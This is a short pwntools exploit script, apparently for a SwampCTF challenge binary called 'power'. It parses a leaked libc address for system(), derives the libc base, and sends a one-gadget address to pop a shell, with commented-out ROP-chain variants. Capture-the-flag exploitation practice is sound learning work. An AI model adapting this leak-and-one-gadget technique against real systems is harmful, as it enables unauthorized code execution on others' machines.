from pwn import *

# Run process
context.arch = 'amd64'
context.terminal = ['tmux','new-window']
#context.aslr = None

#binary = ELF("./power")
libc = ELF("libc.so.6")
r = process(['./power'])
#r = remote('chal1.swampctf.com',1999)



#r = gdb.debug(['./power'],
#        """
#        b *0x0000555555554a99
#        """
#)




sh_real = next(libc.search("sh\x00"))
pop_rdi_real = 0x0019dba5
gets_real = 0x0006ed80
system_real = 0x00045390

off_to_gets = gets_real - system_real
off_to_gadget = pop_rdi_real - system_real


r.sendline("yes")
r.recvuntil("the mage hands you ")
mage_number = int(r.recvuntil("]")[:-1],16)
base = mage_number - system_real

log.info("Got number: " + hex(mage_number))

gadget = mage_number + off_to_gadget
gets = mage_number + off_to_gets
sh = base + sh_real

log.info("Address gets: " + hex(gets) + " At offset: +"+hex(off_to_gets))
log.info("Address gadget: " +hex(gadget))
log.info("Address sh: " +hex(sh))

magic_address = base + 0x45216
r.sendline(p64(magic_address))
#r.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\n")
#r.sendline(p64(gadget)+p64(sh)+p64(mage_number))

r.interactive()


